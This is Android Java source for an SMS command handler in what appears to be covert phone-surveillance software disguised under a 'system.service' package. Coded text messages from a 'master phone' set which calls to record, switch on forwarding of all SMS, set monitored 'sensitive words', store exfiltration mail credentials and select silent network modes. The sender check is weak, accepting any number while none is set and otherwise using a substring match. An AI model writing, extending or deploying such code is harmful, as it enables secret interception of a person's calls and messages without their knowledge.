package system.service;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;
import android.content.Context;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.SmsConsts;
import com.particle.inspector.common.util.sms.CheckinSms;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// When comes here, that means the phone has received the SMS, so now it must be capable to send SMS.
		
		// Indications from system handling -----------------------------------------------------START
		// Forward message from system/server to the master phone
		String upperCaseSmsBody = smsBody.toUpperCase();
		if (upperCaseSmsBody.startsWith(SmsConsts.INDICATION_SYSTEM_MSG)) {
			String msg = smsBody.substring(3).trim();
			String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
			if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
				SmsCtrl.sendSms(recvPhoneNum, msg);
			}
			return;
		}
		else if (upperCaseSmsBody.startsWith(SmsConsts.INDICATION_SYSTEM_STOP)) {
			ConfigCtrl.setStoppedBySystem(context, true);
			// Send back result
			String msg = context.getResources().getString(R.string.indication_stopped_by_system);
			SmsCtrl.sendSms(incomingPhoneNum, msg);
			return;
		}
		else if (upperCaseSmsBody.startsWith(SmsConsts.INDICATION_SYSTEM_RESTORE)) {
			ConfigCtrl.setStoppedBySystem(context, false);
			// Send back result
			String msg = context.getResources().getString(R.string.indication_restored_by_system);
			SmsCtrl.sendSms(incomingPhoneNum, msg);
			return;
		}
		// Indications from system handling -------------------------------------------------------END
		
		// Make sure the indication is coming from qualified phone
		if (!isQualifiedIncomingNum(context, incomingPhoneNum)) {
			String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
			String msg = String.format(context.getResources().getString(R.string.indication_not_come_from_master_phone), 
					masterPhone == null ? "" : masterPhone);
			SmsCtrl.sendSms(incomingPhoneNum, msg);
			return;
		}
		
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		// #0#OFF: deactivate apk, and send SMS to server to clear using record to make it usable in other phone
		if (smsBody.startsWith(SmsConsts.INDICATION_KEY)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				// Cannot register if this phone has been stopped by system
				if (ConfigCtrl.getStoppedBySystem(context)) {
					String msg = context.getResources().getString(R.string.indication_register_ng_sys_stopped);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// If this phone has already been registered, return
				if (GlobalValues.licenseType == LICENSE_TYPE.FULL_LICENSED) {
					String msg = context.getResources().getString(R.string.indication_register_ng_had_registered);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, indication);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) {
					String msg = context.getResources().getString(R.string.indication_register_ng);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// Register and send checkin SMS to server
				else if (type == LICENSE_TYPE.FULL_LICENSED) {
					boolean ret = ConfigCtrl.setLicenseKey(context, indication);
					if (ret) {
						GlobalValues.licenseType = LICENSE_TYPE.FULL_LICENSED;
						ConfigCtrl.setConsumedDatetime(context, new Date());
						SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_register_ok));
						SmsCtrl.sendCheckinSms(context, indication);
					} else {
						String msg = context.getResources().getString(R.string.indication_register_ng_cannot_write);
						SmsCtrl.sendSms(incomingPhoneNum, msg);
					}
				}
			}
			// Unregister indication
			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				// Only can deactivate FULL license key
				if (GlobalValues.licenseType == LICENSE_TYPE.NOT_LICENSED || GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_unregister_ng));
					return;
				}
				
				// Send result to the master
				ConfigCtrl.setLicenseKey(context, "");
				SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_unregister_ok));
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address> <password>: set self sender
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
			if (parts.length < 2) {
				// Send SMS to warn user
				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			String mailAddr = parts[0];
			String pwd      = parts[1];
			
			GlobalPrefActivity.setSenderMail(context, mailAddr);
			GlobalPrefActivity.setSenderPassword(context, pwd);
			
			// Send SMS to user to let him known the result
			String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #2#<mail address>: change receiver mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setReceiverMail(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
					
			if (indication.length() > 0) {
				GlobalPrefActivity.setReceiverPhoneNum(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #4#<interval days>: change get info interval days
		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.parseInt(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (days < 1 ) { days = 1; } 
			else if (days > 7) { days = 7; }
			
			GlobalPrefActivity.setInfoInterval(context, String.valueOf(days));
			String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #5#<target number>: set recording target numbers and cancel recording all
		// #5#ALL: recording all phone calls
		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
				GlobalPrefActivity.setRecordAll(context, true);
				String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			} else {
				String[] numbers = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
						 					 .split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
				boolean valid = true;
				if (numbers.length <= 0 || numbers.length > GlobalPrefActivity.MAX_TARGET_NUM_COUNT) {
					valid = false;
				} else {
					Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
					for (int i=0; i < numbers.length; i++) {
				    	Matcher matcher = p.matcher(numbers[i]);
				    	if (!matcher.matches()) {
				    		valid = false;
				    		break;
				    	}
					}
				}
				
				if (valid) {
					GlobalPrefActivity.setRecordTargetNum(context, indication);
					GlobalPrefActivity.setRecordAll(context, false);// Cancel recording all at meantime
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ok);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				} else {
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				}
			}
		}
		
		// -------------------------------------------------------
		// #6#<network mode>: set network mode
		else if (smsBody.startsWith(SmsConsts.INDICATION_NETWORK_MODE)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			if (!indication.equalsIgnoreCase(SmsConsts.ACTIVE) && 
				!indication.equalsIgnoreCase(SmsConsts.SILENT) &&
				!indication.equalsIgnoreCase(SmsConsts.WIFIACTIVE) &&
				!indication.equalsIgnoreCase(SmsConsts.WIFISILENT)
				) {
				String strContent = context.getResources().getString(R.string.indication_set_network_mode_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (indication.equalsIgnoreCase(SmsConsts.ACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.ACTIVE);
			} else if (indication.equalsIgnoreCase(SmsConsts.SILENT)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.SILENT);
			} else if (indication.equalsIgnoreCase(SmsConsts.WIFIACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.WIFIACTIVE);
			} else { // SmsConsts.WIFISILENT
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.WIFISILENT);
			}
			
			String strContent = context.getResources().getString(R.string.indication_set_network_mode_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #7#<sensitive words>: change sensitive words
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
			if (!ConfigCtrl.isLegal(context)) return;
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable redirect all SMS
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				GlobalPrefActivity.setRedirectAllSms(context, false);
				String strContent = context.getResources().getString(R.string.indication_disable_redirect_all_sms_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			// When it is ON or on, we enable redirect all SMS
			else if (indication.equalsIgnoreCase(SmsConsts.ON)) {
				GlobalPrefActivity.setRedirectAllSms(context, true);
				String strContent = context.getResources().getString(R.string.indication_enable_redirect_all_sms_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			else {
				String oriWords = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length == 0 || words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					String strContent = context.getResources().getString(R.string.indication_set_sens_words_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
				String strContent = context.getResources().getString(R.string.indication_set_sens_words_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #9#<new phone number>: SIM change, so master sent back 
		// the indication to help to recognize self phone number.
		else if (smsBody.startsWith(SmsConsts.INDICATION_SIM_CHANGE)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				ConfigCtrl.setSelfPhoneNum(context, indication);
			}
		}
		
	} // End of handleIndicationSms()
	
	// Rules:
	// All remote indications only accept SMS from recv phone
	private static boolean isQualifiedIncomingNum(Context context, String incomingPhoneNum) 
	{
		String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		if (recvPhoneNum == null || recvPhoneNum.length() <= 0) {
			return true;
		} 
		
		// Indication only accept recv phone
		else {
			if (incomingPhoneNum.contains(recvPhoneNum)) return true;
			else return false;
		}
	}
	
}
